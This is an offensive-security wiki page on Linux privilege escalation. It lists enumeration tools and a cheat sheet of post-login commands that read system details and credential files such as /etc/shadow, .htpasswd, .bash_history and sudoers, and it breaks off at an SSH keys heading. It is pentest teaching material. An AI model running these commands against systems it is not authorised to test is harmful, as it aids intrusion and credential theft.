<!DOCTYPE html>
<html lang="en" class="m-0 p-0 w-screen min-h-screen bg-navy-dark"><head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Linux Privilege Escalation | OffSec Wiki</title>
        <meta name="description" content="Privilege Escalation (PrivEsc) is the act of exploiting a bug, a design flaw, or a configuration oversight in an operating system or software application to gain elevated access to resources that are normally protected from an application or user. Once you have root privileges on Linux, you can get sensitive information in the system.">
        
        <link rel="icon" type="image/x-icon" href="/img/favicon-32.png">
        <link rel="stylesheet" href="/pagefind/pagefind-ui.css"><link rel="stylesheet" href="/styles.css">
        <link rel="stylesheet" href="/css/carbonads.css">
        
        <script type="text/javascript" src="/js/exploit.js"></script>
        

        <meta name="twitter:card" content="summary_large_image">
        <meta name="twitter:site" content="@muhammdhaidari">
        <meta name="twitter:creator" content="@muhammdhaidari">
        <meta property="og:url" content="https://offsec.PenTest.tools/exploit/linux/privilege-escalation/">
        <meta property="og:title" content="Linux Privilege Escalation | OffSec Wiki">
        <meta property="og:description" content="Privilege Escalation (PrivEsc) is the act of exploiting a bug, a design flaw, or a configuration oversight in an operating system or software application to gain elevated access to resources that are normally protected from an application or user. Once you have root privileges on Linux, you can get sensitive information in the system.">
        <meta property="og:image" content="https://offsec.PenTest.tools/img/screenshot.png">
        
        <script async="" src="https://www.googletagmanager.com/gtag/js?id=G-RR6XYHYTQ9"></script>
        <script>
        window.dataLayer = window.dataLayer || [];
        function gtag(){dataLayer.push(arguments);}
        gtag('js', new Date());

        gtag('config', 'G-RR6XYHYTQ9');
        </script>
    <script type="text/javascript" src="/pagefind/pagefind-ui.js"></script><script type="text/javascript">window.addEventListener('DOMContentLoaded', () => { new PagefindUI({"element":"#search","showImages":false,"showEmptyFilters":true,"resetStyles":true,"bundlePath":"/pagefind/","baseUrl":"/"}); });</script><link rel="stylesheet" href="/codecopy/codecopy.css"><script type="text/javascript" src="/codecopy/codecopy.js"></script></head>

    <body class="m-0 p-0 w-screen min-h-screen text-basic text-white text-sm">

        <header class="sticky top-0 w-full h-[70px] z-20 bg-gradient-to-r from-pink-dark">
    <div class="mx-auto w-full sm:w-2/3 h-full flex justify-around items-center">
        <div class="w-full h-full p-2 flex items-center space-x-3">
            <a href="/" class="hidden sm:block">
                <span class="text-base text-white font-bold">OFFSEC Wiki</span>
            </a>
            
            <div id="search"></div>
        </div>

        
        <div class="hidden sm:flex w-full h-full p-2 items-center justify-center space-x-3">
            
            <a href="https://github.com/muhammd/" target="_blank" rel="noopener noreferrer" alt="GitHub">
                <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewbox="0 0 24 24" class="fill-white w-8 h-8 hover:brightness-200">
                    <path d="M12 0c-6.626 0-12 5.373-12 12 0 5.302 3.438 9.8 8.207 11.387.599.111.793-.261.793-.577v-2.234c-3.338.726-4.033-1.416-4.033-1.416-.546-1.387-1.333-1.756-1.333-1.756-1.089-.745.083-.729.083-.729 1.205.084 1.839 1.237 1.839 1.237 1.07 1.834 2.807 1.304 3.492.997.107-.775.418-1.305.762-1.604-2.665-.305-5.467-1.334-5.467-5.931 0-1.311.469-2.381 1.236-3.221-.124-.303-.535-1.524.117-3.176 0 0 1.008-.322 3.301 1.23.957-.266 1.983-.399 3.003-.404 1.02.005 2.047.138 3.006.404 2.291-1.552 3.297-1.23 3.297-1.23.653 1.653.242 2.874.118 3.176.77.84 1.235 1.911 1.235 3.221 0 4.609-2.807 5.624-5.479 5.921.43.372.823 1.102.823 2.222v3.293c0 .319.192.694.801.576 4.765-1.589 8.199-6.086 8.199-11.386 0-6.627-5.373-12-12-12z"></path></svg>
            </a>
            
            <a href="https://twitter.com/muhammdhaidari" target="_blank" rel="noopener noreferrer" alt="Twitter">
                <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewbox="0 0 24 24" class="fill-sky w-8 h-8 hover:brightness-200">
                    <path d="M12 0c-6.627 0-12 5.373-12 12s5.373 12 12 12 12-5.373 12-12-5.373-12-12-12zm6.066 9.645c.183 4.04-2.83 8.544-8.164 8.544-1.622 0-3.131-.476-4.402-1.291 1.524.18 3.045-.244 4.252-1.189-1.256-.023-2.317-.854-2.684-1.995.451.086.895.061 1.298-.049-1.381-.278-2.335-1.522-2.304-2.853.388.215.83.344 1.301.359-1.279-.855-1.641-2.544-.889-3.835 1.416 1.738 3.533 2.881 5.92 3.001-.419-1.796.944-3.527 2.799-3.527.825 0 1.572.349 2.096.907.654-.128 1.27-.368 1.824-.697-.215.671-.67 1.233-1.263 1.589.581-.07 1.135-.224 1.649-.453-.384.578-.87 1.084-1.433 1.489z"></path></svg>
            </a>
        </div>
    </div>
</header>

<div id="search_bg" class="fixed top-0 left-0 w-full z-10 h-full bg-black opacity-50 hidden"></div>


<script>
    window.addEventListener('DOMContentLoaded', () => {
        //Display the black filter when searching
        const searchBgElem = document.getElementById("search_bg");
        const drawerElem = document.querySelector(".pagefind-ui__drawer");
        const inputElem = document.querySelector(".pagefind-ui__search-input");

        if (searchBgElem) {
            searchBgElem.addEventListener('click', () => {
                searchBgElem.classList.add("hidden");
                drawerElem.style.visibility = "hidden";
                drawerElem.style.opacity = 0;
            });
        }

        inputElem.addEventListener('focus', () => {
            if (searchBgElem) {
                searchBgElem.classList.remove("hidden");
                drawerElem.style.visibility = "visible";
                drawerElem.style.opacity = 1;
            }
        });
    });
</script>

        <main class="w-full h-full">
            <div class="block sm:grid grid-cols-[320px_minmax(400px,_1fr)_280px] py-2">

    
    <div id="exploit-leftside-inner" class="hidden sm:block w-full h-screen overflow-y-auto px-4 py-3">
        <div class="w-full">
            <div id="exploit-related">
                <h4 class="mb-4 border-b-2 border-slate-light text-base text-white opacity-60">
                    Exploits related to Linux
                </h4>
                
                    <h4 class="mb-4 border-b-2 border-slate-light text-base text-white opacity-80">Privilege Escalation</h4>
                    
                        <div class="my-3">
                        
                            <a href="/exploit/linux/privilege-escalation/ansible-playbook-privilege-escalation/" class="text-sm text-pink-light hover:brightness-200">
                                Ansible Playbook Privilege Escalation
                            </a>
                        
                        </div>
                    
                        <div class="my-3">
                        
                            <a href="/exploit/linux/privilege-escalation/apache-conf-privilege-escalation/" class="text-sm text-pink-light hover:brightness-200">
                                Apache Conf Privilege Escalation
                            </a>
                        
                        </div>
                    
                        <div class="my-3">
                        
                            <a href="/exploit/linux/privilege-escalation/bash-eq-privilege-escalation/" class="text-sm text-pink-light hover:brightness-200">
                                Bash eq Privilege Escalation
                            </a>
                        
                        </div>
                    
                        <div class="my-3">
                        
                            <a href="/exploit/linux/privilege-escalation/buffer-overflow-privilege-escalation/" class="text-sm text-pink-light hover:brightness-200">
                                Buffer Overflow Privilege Escalation
                            </a>
                        
                        </div>
                    
                        <div class="my-3">
                        
                            <a href="/exploit/linux/privilege-escalation/chrome-remote-debugger-pentesting/" class="text-sm text-pink-light hover:brightness-200">
                                Chrome Remote Debugger Pentesting
                            </a>
                        
                        </div>
                    
                        <div class="my-3">
                        
                            <a href="/exploit/linux/privilege-escalation/doas/" class="text-sm text-pink-light hover:brightness-200">
                                Doas Privilege Escalation
                            </a>
                        
                        </div>
                    
                        <div class="my-3">
                        
                            <a href="/exploit/linux/privilege-escalation/ghidra-debug-mode-rce/" class="text-sm text-pink-light hover:brightness-200">
                                Ghidra Debug Mode RCE
                            </a>
                        
                        </div>
                    
                        <div class="my-3">
                        
                            <a href="/exploit/linux/privilege-escalation/gnuplot-privilege-escalation/" class="text-sm text-pink-light hover:brightness-200">
                                Gnuplot Privilege Escalation
                            </a>
                        
                        </div>
                    
                        <div class="my-3">
                        
                            <a href="/exploit/linux/container/lxc-lxd-privilege-escalation/" class="text-sm text-pink-light hover:brightness-200">
                                LXC/LXD (Linux Container/Daemon) Privilege Escalation
                            </a>
                        
                        </div>
                    
                        <div class="my-3">
                        
                            <span id="scroll-target" class="text-sm text-white">Linux Privilege Escalation</span>
                        
                        </div>
                    
                        <div class="my-3">
                        
                            <a href="/exploit/linux/privilege-escalation/mozilla-pentsting/" class="text-sm text-pink-light hover:brightness-200">
                                Mozilla Pentesting
                            </a>
                        
                        </div>
                    
                        <div class="my-3">
                        
                            <a href="/exploit/linux/privilege-escalation/openssl-privilege-escalation/" class="text-sm text-pink-light hover:brightness-200">
                                OpenSSL Privilege Escalation
                            </a>
                        
                        </div>
                    
                        <div class="my-3">
                        
                            <a href="/exploit/linux/privilege-escalation/pip-download-code-execution/" class="text-sm text-pink-light hover:brightness-200">
                                Pip Download Code Execution
                            </a>
                        
                        </div>
                    
                        <div class="my-3">
                        
                            <a href="/exploit/linux/privilege-escalation/polkit-privilege-escalation/" class="text-sm text-pink-light hover:brightness-200">
                                PolKit Privilege Escalation
                            </a>
                        
                        </div>
                    
                        <div class="my-3">
                        
                            <a href="/exploit/linux/privilege-escalation/python-eval-code-execution/" class="text-sm text-pink-light hover:brightness-200">
                                Python Eval Code Execution
                            </a>
                        
                        </div>
                    
                        <div class="my-3">
                        
                            <a href="/exploit/linux/privilege-escalation/python-jails-escape/" class="text-sm text-pink-light hover:brightness-200">
                                Python Jails Escape
                            </a>
                        
                        </div>
                    
                        <div class="my-3">
                        
                            <a href="/exploit/linux/privilege-escalation/python-privilege-escalation/" class="text-sm text-pink-light hover:brightness-200">
                                Python Privilege Escalation
                            </a>
                        
                        </div>
                    
                        <div class="my-3">
                        
                            <a href="/exploit/linux/privilege-escalation/python-yaml-privilege-escalation/" class="text-sm text-pink-light hover:brightness-200">
                                Python Yaml Privilege Escalation
                            </a>
                        
                        </div>
                    
                        <div class="my-3">
                        
                            <a href="/exploit/linux/privilege-escalation/ruby-privilege-escalation/" class="text-sm text-pink-light hover:brightness-200">
                                Ruby Privilege Escalation
                            </a>
                        
                        </div>
                    
                        <div class="my-3">
                        
                            <a href="/exploit/linux/privilege-escalation/rust-privilege-escalation/" class="text-sm text-pink-light hover:brightness-200">
                                Rust Privilege Escalation
                            </a>
                        
                        </div>
                    
                        <div class="my-3">
                        
                            <a href="/exploit/linux/privilege-escalation/sssd-privilege-escalation/" class="text-sm text-pink-light hover:brightness-200">
                                SSSD Privilege Escalation
                            </a>
                        
                        </div>
                    
                        <div class="my-3">
                        
                            <a href="/exploit/linux/privilege-escalation/shared-library-hijacking/" class="text-sm text-pink-light hover:brightness-200">
                                Shared Library Hijacking
                            </a>
                        
                        </div>
                    
                        <div class="my-3">
                        
                            <a href="/exploit/linux/privilege-escalation/snapd-privilege-escalation/" class="text-sm text-pink-light hover:brightness-200">
                                Snapd Privilege Escalation
                            </a>
                        
                        </div>
                    
                        <div class="my-3">
                        
                            <a href="/exploit/linux/privilege-escalation/sudo/sudo-clamav-privilege-escalation/" class="text-sm text-pink-light hover:brightness-200">
                                Sudo ClamAV Privilege Escalation
                            </a>
                        
                        </div>
                    
                        <div class="my-3">
                        
                            <a href="/exploit/linux/privilege-escalation/sudo/sudo-dstat-privilege-escalation/" class="text-sm text-pink-light hover:brightness-200">
                                Sudo Dstat Privilege Escalation
                            </a>
                        
                        </div>
                    
                        <div class="my-3">
                        
                            <a href="/exploit/linux/privilege-escalation/sudo/sudo-exiftool-privilege-escalation/" class="text-sm text-pink-light hover:brightness-200">
                                Sudo Exiftool Privilege Escalation
                            </a>
                        
                        </div>
                    
                        <div class="my-3">
                        
                            <a href="/exploit/linux/privilege-escalation/sudo/sudo-fail2ban-privilege-escalation/" class="text-sm text-pink-light hover:brightness-200">
                                Sudo Fail2ban Privilege Escalation
                            </a>
                        
                        </div>
                    
                        <div class="my-3">
                        
                            <a href="/exploit/linux/privilege-escalation/sudo/sudo-git-privilege-escalation/" class="text-sm text-pink-light hover:brightness-200">
                                Sudo Git Privilege Escalation
                            </a>
                        
                        </div>
                    
                        <div class="my-3">
                        
                            <a href="/exploit/linux/privilege-escalation/sudo/sudo-java-privilege-escalation/" class="text-sm text-pink-light hover:brightness-200">
                                Sudo Java Privilege Escalation
                            </a>
                        
                        </div>
                    
                        <div class="my-3">
                        
                            <a href="/exploit/linux/privilege-escalation/sudo/sudo-openvpn-privilege-escalation/" class="text-sm text-pink-light hover:brightness-200">
                                Sudo OpenVPN Privilege Escalation
                            </a>
                        
                        </div>
                    
                        <div class="my-3">
                        
                            <a href="/exploit/linux/privilege-escalation/sudo/sudo-path-traversal-privilege-escalation/" class="text-sm text-pink-light hover:brightness-200">
                                Sudo Path Traversal Privilege Escalation
                            </a>
                        
                        </div>
                    
                        <div class="my-3">
                        
                            <a href="/exploit/linux/privilege-escalation/sudo/" class="text-sm text-pink-light hover:brightness-200">
                                Sudo Privilege Escalation
                            </a>
                        
                        </div>
                    
                        <div class="my-3">
                        
                            <a href="/exploit/linux/privilege-escalation/sudo/sudo-privilege-escalation-by-overriding-shared-library/" class="text-sm text-pink-light hover:brightness-200">
                                Sudo Privilege Escalation by Overriding Shared Library
                            </a>
                        
                        </div>
                    
                        <div class="my-3">
                        
                            <a href="/exploit/linux/privilege-escalation/sudo/sudo-reboot-privilege-escalation/" class="text-sm text-pink-light hover:brightness-200">
                                Sudo Reboot Privilege Escalation
                            </a>
                        
                        </div>
                    
                        <div class="my-3">
                        
                            <a href="/exploit/linux/privilege-escalation/sudo/sudo-screen-privilege-escalation/" class="text-sm text-pink-light hover:brightness-200">
                                Sudo Screen Privilege Escalation
                            </a>
                        
                        </div>
                    
                        <div class="my-3">
                        
                            <a href="/exploit/linux/privilege-escalation/sudo/sudo-service-privilege-escalation/" class="text-sm text-pink-light hover:brightness-200">
                                Sudo Service Privilege Escalation
                            </a>
                        
                        </div>
                    
                        <div class="my-3">
                        
                            <a href="/exploit/linux/privilege-escalation/sudo/sudo-shutdown-poweroff-privilege-escalation/" class="text-sm text-pink-light hover:brightness-200">
                                Sudo Shutdown, Poweroff Privilege Escalation
                            </a>
                        
                        </div>
                    
                        <div class="my-3">
                        
                            <a href="/exploit/linux/privilege-escalation/sudo/sudo-systemctl-privilege-escalation/" class="text-sm text-pink-light hover:brightness-200">
                                Sudo Systemctl Privilege Escalation
                            </a>
                        
                        </div>
                    
                        <div class="my-3">
                        
                            <a href="/exploit/linux/privilege-escalation/sudo/sudo-tee-privilege-escalation/" class="text-sm text-pink-light hover:brightness-200">
                                Sudo Tee Privilege Escalation
                            </a>
                        
                        </div>
                    
                        <div class="my-3">
                        
                            <a href="/exploit/linux/privilege-escalation/sudo/sudo-umount-privilege-escalation/" class="text-sm text-pink-light hover:brightness-200">
                                Sudo Umount Privilege Escalation
                            </a>
                        
                        </div>
                    
                        <div class="my-3">
                        
                            <a href="/exploit/linux/privilege-escalation/sudo/sudo-vim-privilege-escalation/" class="text-sm text-pink-light hover:brightness-200">
                                Sudo Vim Privilege Escalation
                            </a>
                        
                        </div>
                    
                        <div class="my-3">
                        
                            <a href="/exploit/linux/privilege-escalation/sudo/sudo-wall-privilege-escalation/" class="text-sm text-pink-light hover:brightness-200">
                                Sudo Wall Privilege Escalation
                            </a>
                        
                        </div>
                    
                        <div class="my-3">
                        
                            <a href="/exploit/linux/privilege-escalation/sudo/sudo-wget-privilege-escalation/" class="text-sm text-pink-light hover:brightness-200">
                                Sudo Wget Privilege Escalation
                            </a>
                        
                        </div>
                    
                        <div class="my-3">
                        
                            <a href="/exploit/linux/privilege-escalation/sudo/sudoedit-privilege-escalation/" class="text-sm text-pink-light hover:brightness-200">
                                Sudoedit Privilege Escalation
                            </a>
                        
                        </div>
                    
                        <div class="my-3">
                        
                            <a href="/exploit/linux/privilege-escalation/tar-wildcard-injection-privesc/" class="text-sm text-pink-light hover:brightness-200">
                                Tar Wildcard Injection PrivEsc
                            </a>
                        
                        </div>
                    
                        <div class="my-3">
                        
                            <a href="/exploit/linux/privilege-escalation/update-motd-privilege-escalation/" class="text-sm text-pink-light hover:brightness-200">
                                Update-Motd Privilege Escalation
                            </a>
                        
                        </div>
                    
                        <div class="my-3">
                        
                            <a href="/exploit/linux/privilege-escalation/irb-privilege-escalation/" class="text-sm text-pink-light hover:brightness-200">
                                irb (Interactive Ruby Shell) Privilege Escalation
                            </a>
                        
                        </div>
                    

                    
                
                    <h4 class="mb-4 border-b-2 border-slate-light text-base text-white opacity-80">Post Exploitation</h4>
                    
                        <div class="my-3">
                        
                            <a href="/exploit/linux/post-exploitation/linux-backdoors/" class="text-sm text-pink-light hover:brightness-200">
                                Linux Backdoors
                            </a>
                        
                        </div>
                    
                        <div class="my-3">
                        
                            <a href="/exploit/linux/post-exploitation/linux-pivoting/" class="text-sm text-pink-light hover:brightness-200">
                                Linux Pivoting
                            </a>
                        
                        </div>
                    

                    
                
                    <h4 class="mb-4 border-b-2 border-slate-light text-base text-white opacity-80">Backup</h4>
                    
                        <div class="my-3">
                        
                            <a href="/exploit/linux/backup/borgbackup-pentesting/" class="text-sm text-pink-light hover:brightness-200">
                                BorgBackup Pentesting
                            </a>
                        
                        </div>
                    

                    
                
                    <h4 class="mb-4 border-b-2 border-slate-light text-base text-white opacity-80">Container</h4>
                    
                        <div class="my-3">
                        
                            <a href="/exploit/linux/container/lxc-lxd-privilege-escalation/" class="text-sm text-pink-light hover:brightness-200">
                                LXC/LXD (Linux Container/Daemon) Privilege Escalation
                            </a>
                        
                        </div>
                    

                    
                
                    <h4 class="mb-4 border-b-2 border-slate-light text-base text-white opacity-80">Archive</h4>
                    
                        <div class="my-3">
                        
                            <a href="/exploit/linux/archive/7z/" class="text-sm text-pink-light hover:brightness-200">
                                7z
                            </a>
                        
                        </div>
                    
                        <div class="my-3">
                        
                            <a href="/exploit/linux/archive/bzip-bunzip/" class="text-sm text-pink-light hover:brightness-200">
                                Bzip2 &amp; Bunzip2
                            </a>
                        
                        </div>
                    
                        <div class="my-3">
                        
                            <a href="/exploit/linux/archive/crack-zip-password/" class="text-sm text-pink-light hover:brightness-200">
                                Crack Zip Password
                            </a>
                        
                        </div>
                    
                        <div class="my-3">
                        
                            <a href="/exploit/linux/archive/gzip-gunzip/" class="text-sm text-pink-light hover:brightness-200">
                                Gzip &amp; Gunzip
                            </a>
                        
                        </div>
                    
                        <div class="my-3">
                        
                            <a href="/exploit/linux/archive/tar/" class="text-sm text-pink-light hover:brightness-200">
                                Tar
                            </a>
                        
                        </div>
                    
                        <div class="my-3">
                        
                            <a href="/exploit/linux/archive/zip-unzip/" class="text-sm text-pink-light hover:brightness-200">
                                Zip &amp; Unzip
                            </a>
                        
                        </div>
                    

                    
                
                    <h4 class="mb-4 border-b-2 border-slate-light text-base text-white opacity-80">Attack</h4>
                    
                        <div class="my-3">
                        
                            <a href="/exploit/linux/attack/fork-bomb/" class="text-sm text-pink-light hover:brightness-200">
                                Fork Bomb
                            </a>
                        
                        </div>
                    

                    
                
                    <h4 class="mb-4 border-b-2 border-slate-light text-base text-white opacity-80">Others</h4>
                    

                    
                        
                            <div class="my-3">
                            
                                <a href="/exploit/linux/linux-techniques/" class="text-sm text-pink-light hover:brightness-200">
                                    Linux Techniques
                                </a>
                            
                            </div>
                        
                            <div class="my-3">
                            
                                <a href="/exploit/linux/linux-troubleshooting/" class="text-sm text-pink-light hover:brightness-200">
                                    Linux Troubleshooting
                                </a>
                            
                            </div>
                        
                            <div class="my-3">
                            
                                <a href="/exploit/linux/linux-user-file-management/" class="text-sm text-pink-light hover:brightness-200">
                                    Linux User &amp; File Management
                                </a>
                            
                            </div>
                        
                            <div class="my-3">
                            
                                <a href="/exploit/linux/x11-pentesting/" class="text-sm text-pink-light hover:brightness-200">
                                    X11 (X Window System) Pentesting
                                </a>
                            
                            </div>
                        
                    
                
            </div>
        </div>
    </div>
    

    <div id="exploit-center-inner" class="w-full h-screen overflow-y-auto px-6 py-3" data-pagefind-body="">
        <article>
            <div class="w-full p-4">
                <h1 id="exploit-title" class="text-4xl font-bold">Linux Privilege Escalation</h1>

                <p class="my-3 text-base">Last modified: 2023-09-14</p>
                <div class="my-3 flex flex-wrap items-end space-x-2 space-y-2">
                    
                    <span class="bg-pink-dark rounded-md text-base px-3 py-1 text-white">Privilege Escalation</span>
                    
                    <span class="bg-pink-dark rounded-md text-base px-3 py-1 text-white">Remote Code Execution</span>
                    
                </div>
            </div>

            <hr class="border-1 border-white opacity-40">

            <p class="px-2 py-4 text-base">Privilege Escalation (PrivEsc) is the act of exploiting a bug, a design flaw, or a configuration oversight in an operating system or software application to gain elevated access to resources that are normally protected from an application or user. Once you have root privileges on Linux, you can get sensitive information in the system.</p>

            <div id="exploit-content" class="px-2 py-4 text-base">
                <h2 id="automation" tabindex="-1"><a href="#automation" class="header-anchor">Automation</a></h2>
<p>There are some tools for investigating automatically.</p>
<ul>
<li><strong><a href="https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS">LinPEAS</a></strong></li>
<li><strong><a href="https://github.com/mzet-/linux-exploit-suggester">Linux Exploit Suggester</a></strong></li>
<li><strong><a href="https://github.com/diego-treitos/linux-smart-enumeration">Linux Smart Enumeration</a></strong></li>
</ul>
<br>
<h2 id="messages-when-logged-in" tabindex="-1"><a href="#messages-when-logged-in" class="header-anchor">Messages When Logged In</a></h2>
<p>After logged in the target system, don’t miss the messages. We might find interesting information.</p>
<br>
<h2 id="os-information" tabindex="-1"><a href="#os-information" class="header-anchor">OS Information</a></h2>
<pre class="codecopy_pre codecopy_pre_0"><code class="language-sh hljs language-bash">hostname
<span class="syntax-comment"># Alias</span>
hostname -a
<span class="syntax-comment"># DNS</span>
hostname -d
<span class="syntax-comment"># IP address for the host name</span>
hostname -i
<span class="syntax-comment"># All IP address for the host</span>
hostname -I

<span class="syntax-built_in">uname</span> -a
<span class="syntax-comment"># Kernel release</span>
<span class="syntax-built_in">uname</span> -r
<span class="syntax-comment"># Kernel version</span>
<span class="syntax-built_in">uname</span> -v
<span class="syntax-comment"># OS</span>
<span class="syntax-built_in">uname</span> -o

<span class="syntax-comment"># OS kernel version</span>
<span class="syntax-built_in">cat</span> /proc/version
<span class="syntax-built_in">cat</span> /etc/*release

<span class="syntax-comment"># Current user</span>
<span class="syntax-built_in">whoami</span>
<span class="syntax-built_in">id</span>
<span class="syntax-built_in">groups</span>

<span class="syntax-comment"># Environments</span>
<span class="syntax-built_in">env</span>
<span class="syntax-built_in">echo</span> <span class="syntax-variable">$PATH</span>

<span class="syntax-comment"># Positional arguments</span>
<span class="syntax-built_in">echo</span> <span class="syntax-variable">$0</span>
<span class="syntax-built_in">echo</span> <span class="syntax-variable">$1</span>
<span class="syntax-built_in">echo</span> <span class="syntax-variable">$2</span>
</code><button class="codecopy_copy" data-codecopy="0">
<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewbox="0 0 24 24" stroke-width="2.0" stroke="currentColor" class="w-6 h-6">
    <path stroke-linecap="round" stroke-linejoin="round" d="M15.75 17.25v3.375c0 .621-.504 1.125-1.125 1.125h-9.75a1.125 1.125 0 01-1.125-1.125V7.875c0-.621.504-1.125 1.125-1.125H6.75a9.06 9.06 0 011.5.124m7.5 10.376h3.375c.621 0 1.125-.504 1.125-1.125V11.25c0-4.46-3.243-8.161-7.5-8.876a9.06 9.06 0 00-1.5-.124H9.375c-.621 0-1.125.504-1.125 1.125v3.5m7.5 10.375H9.375a1.125 1.125 0 01-1.125-1.125v-9.25m12 6.625v-1.875a3.375 3.375 0 00-3.375-3.375h-1.5a1.125 1.125 0 01-1.125-1.125v-1.5a3.375 3.375 0 00-3.375-3.375H9.75"></path>
</svg><span class="codecopy_result">Copied!</span></button></pre>
<h3 id="find-os-vulnerability" tabindex="-1"><a href="#find-os-vulnerability" class="header-anchor">Find OS Vulnerability</a></h3>
<p>If we run <strong><code>uname -a</code></strong> and get the OS version, search vulnerabilities.</p>
<pre class="codecopy_pre codecopy_pre_1"><code class="language-txt hljs language-plaintext">Linux examplehost 4.4.0-31-generic #50-Ubuntu SMP Wed Jul 13 00:07:12 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux
</code><button class="codecopy_copy" data-codecopy="1">
<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewbox="0 0 24 24" stroke-width="2.0" stroke="currentColor" class="w-6 h-6">
    <path stroke-linecap="round" stroke-linejoin="round" d="M15.75 17.25v3.375c0 .621-.504 1.125-1.125 1.125h-9.75a1.125 1.125 0 01-1.125-1.125V7.875c0-.621.504-1.125 1.125-1.125H6.75a9.06 9.06 0 011.5.124m7.5 10.376h3.375c.621 0 1.125-.504 1.125-1.125V11.25c0-4.46-3.243-8.161-7.5-8.876a9.06 9.06 0 00-1.5-.124H9.375c-.621 0-1.125.504-1.125 1.125v3.5m7.5 10.375H9.375a1.125 1.125 0 01-1.125-1.125v-9.25m12 6.625v-1.875a3.375 3.375 0 00-3.375-3.375h-1.5a1.125 1.125 0 01-1.125-1.125v-1.5a3.375 3.375 0 00-3.375-3.375H9.75"></path>
</svg><span class="codecopy_result">Copied!</span></button></pre>
<p>For example above, we can search <strong><code>ubuntu 4.4.0-31-generic</code></strong> in search engines.</p>
<br>
<h2 id="interesting-information" tabindex="-1"><a href="#interesting-information" class="header-anchor">Interesting Information</a></h2>
<pre class="codecopy_pre codecopy_pre_2"><code class="language-sh hljs language-bash"><span class="syntax-comment"># Authentication event logs</span>
<span class="syntax-built_in">cat</span> /var/log/auth.log | grep chpasswd
<span class="syntax-built_in">cat</span> /var/log/auth.log | grep root
strings /var/log/auth.log | grep chpasswd
strings /var/log/auth.log | grep root

<span class="syntax-comment"># Apache</span>
<span class="syntax-built_in">cat</span> /var/log/apache/access.log
<span class="syntax-built_in">cat</span> /var/log/apache/error.log
<span class="syntax-built_in">cat</span> /var/log/apache2/access.log
<span class="syntax-built_in">cat</span> /var/log/apache2/error.log
<span class="syntax-built_in">cat</span> /etc/apache2/.htpasswd
<span class="syntax-built_in">cat</span> /etc/apache2/sites-enabled/domain.conf
<span class="syntax-built_in">cat</span> /etc/apache2/sites-available/domain.conf
<span class="syntax-built_in">cat</span> /etc/apache2/sites-available/000-default.conf
<span class="syntax-built_in">cat</span> /usr/local/apache2/conf/httpd.conf
<span class="syntax-built_in">ls</span> -al /usr/local/apache2/htdocs/

<span class="syntax-comment"># Nginx</span>
<span class="syntax-built_in">cat</span> /var/log/nginx/access.log
<span class="syntax-built_in">cat</span> /var/log/nginx/error.log
<span class="syntax-built_in">cat</span> /etc/nginx/nginx.conf
<span class="syntax-built_in">cat</span> /etc/nginx/conf.d/.htpasswd
<span class="syntax-built_in">cat</span> /etc/nginx/sites-available/example.com.conf
<span class="syntax-built_in">cat</span> /etc/nginx/sites-enabled/example.com.conf
<span class="syntax-built_in">cat</span> /usr/local/nginx/conf/nginx.conf
<span class="syntax-built_in">cat</span> /usr/local/etc/nginx/nginx.conf

<span class="syntax-comment"># PHP web conf</span>
<span class="syntax-built_in">cat</span> /etc/php/x.x/apache2/php.ini
<span class="syntax-built_in">cat</span> /etc/php/x.x/cli/php.ini
<span class="syntax-built_in">cat</span> /etc/php/x.x/fpm/php.ini

<span class="syntax-comment"># Bash Files</span>
<span class="syntax-built_in">cat</span> .bashrc
<span class="syntax-built_in">cat</span> .bash_history
<span class="syntax-built_in">cat</span> .bash_profile
<span class="syntax-built_in">cat</span> .profile
<span class="syntax-built_in">cat</span> /var/log/bash.log

<span class="syntax-comment"># Cron jobs</span>
<span class="syntax-built_in">cat</span> /etc/cron*
<span class="syntax-built_in">cat</span> /etc/crontab
<span class="syntax-built_in">cat</span> /etc/cron.d/*
<span class="syntax-built_in">cat</span> /etc/cron.daily/*
<span class="syntax-built_in">cat</span> /etc/cron.hourly/*
<span class="syntax-built_in">cat</span> /etc/cron.monthly/*
<span class="syntax-built_in">cat</span> /etc/cron.weekly/*
<span class="syntax-built_in">cat</span> /var/spool/cron/*
<span class="syntax-built_in">cat</span> /var/spool/cron/crontabs/*
<span class="syntax-comment"># List all cron jobs</span>
crontab -l
crontab -l -u username

<span class="syntax-comment"># Hosts</span>
<span class="syntax-built_in">cat</span> /etc/hosts
<span class="syntax-comment"># LDAP config</span>
<span class="syntax-built_in">cat</span> /etc/ldap/ldap.conf
<span class="syntax-comment"># Messages</span>
<span class="syntax-built_in">cat</span> /etc/issue
<span class="syntax-built_in">cat</span> /etc/motd

<span class="syntax-comment"># MySQL (MariaDB)</span>
<span class="syntax-built_in">cat</span> /etc/mysql/my.cnf
<span class="syntax-built_in">cat</span> /etc/mysql/debian.cnf
<span class="syntax-built_in">cat</span> /etc/mysql/mariadb.cnf
<span class="syntax-built_in">cat</span> /etc/mysql/conf.d/mysql.cnf
<span class="syntax-built_in">cat</span> /etc/mysql/mysql.conf.d/mysql.cnf

<span class="syntax-comment"># Nameserver</span>
<span class="syntax-built_in">cat</span> /etc/resolv.conf
<span class="syntax-comment"># NFS settings</span>
<span class="syntax-built_in">cat</span> /etc/exports
<span class="syntax-comment"># PAM</span>
<span class="syntax-built_in">cat</span> /etc/pam.d/passwd
<span class="syntax-comment"># Sudo config</span>
<span class="syntax-built_in">cat</span> /etc/sudoers
<span class="syntax-built_in">cat</span> /etc/sudoers.d/usersgroup
<span class="syntax-comment"># SSH config</span>
<span class="syntax-built_in">cat</span> /etc/ssh/ssh_config
<span class="syntax-built_in">cat</span> /etc/ssh/sshd_config
<span class="syntax-comment"># Users and passwords</span>
<span class="syntax-built_in">cat</span> /etc/passwd
<span class="syntax-built_in">cat</span> /etc/shadow
<span class="syntax-comment"># List of all groups on the system</span>
<span class="syntax-built_in">cat</span> /etc/group

<span class="syntax-comment"># File system table</span>
<span class="syntax-built_in">cat</span> /etc/fstab

<span class="syntax-comment"># Xpad (sensitive information e.g. user password)</span>
<span class="syntax-built_in">cat</span> .config/xpad/*

<span class="syntax-comment"># SSH keys</span>
